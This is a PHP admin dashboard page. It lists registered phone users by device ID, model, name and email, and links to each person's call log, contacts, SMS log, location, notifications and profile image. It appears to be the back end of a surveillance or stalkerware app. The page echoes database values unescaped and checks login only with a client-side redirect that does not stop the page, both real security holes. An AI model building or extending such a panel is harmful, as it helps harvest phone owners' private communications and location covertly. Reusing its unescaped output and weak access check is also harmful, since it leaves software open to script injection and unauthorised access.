<?php include('dashboard.php') ?>

<?php
session_start();


$view = $_SESSION['admin'];


if (!isset($view)) {
    echo "<script>location.href = '../login.php'</script>";
}




?>
<style>
    .dashboard a
    {
        background: black !important;
    }
    
</style>

<main role="main" class="pt-4">

  

<table id="example" class="display" style="width:100%">
        <thead>
            <tr class="headertr">
                    <th>id</th>
                    <th>Device Id</th>
                    <th>Model</th>
                    <th>Manufacturer</th>
                    <th>Name</th>
                    <th>Email</th>            
                    <th>Search</th>
                    <th>Status</th>
            </tr>
        </thead>
        <tbody>
            <?php
            include 'config.php';

            $sql = "SELECT * FROM `user` ORDER BY id DESC";
            $result = $conn->query($sql);
            if ($result->num_rows > 0) {
                while ($row = $result->fetch_assoc()) {
                    echo "<tr>";
                    echo "<td>{$row['id']}</td>";
                    echo "<td>{$row['device_id']}</td>";
                    echo "<td>{$row['model']}</td>";
                    echo "<td>{$row['manufacturer']}</td>";
                    echo "<td>{$row['name']}</td>";
                    echo "<td>{$row['email']}</td>";
                    echo " <td><div class='dropdown'>
                    <button class='dropbtn'> Find</button>
                    <div class='dropdown-content'>
                      <a href='calllog.php?id=$row[id]'>Call Log</a>
                      <a href='contact.php?id=$row[id]'>Contact</a>
                      <a href='deviceinfo.php?id=$row[id]'>Deviceinfo</a>
                      <a href='smslog.php?id=$row[id]'>Sms Log</a>
                      <a href='location.php?id=$row[id]'>location</a>
                      <a href='notification.php?id=$row[id]'>Notification</a>
                      <a href='profimage.php?id=$row[id]'>Profimage</a>
                    </div>
                    </td>";
                    echo "<td>{$row['status']}</td>";
                    
                    echo "</tr>";
                }
            }
            

            // Close the database connection
            $conn->close();
            ?>
        </tbody>
    </table>

        <script src="js/datatable.min.js"></script>
</main>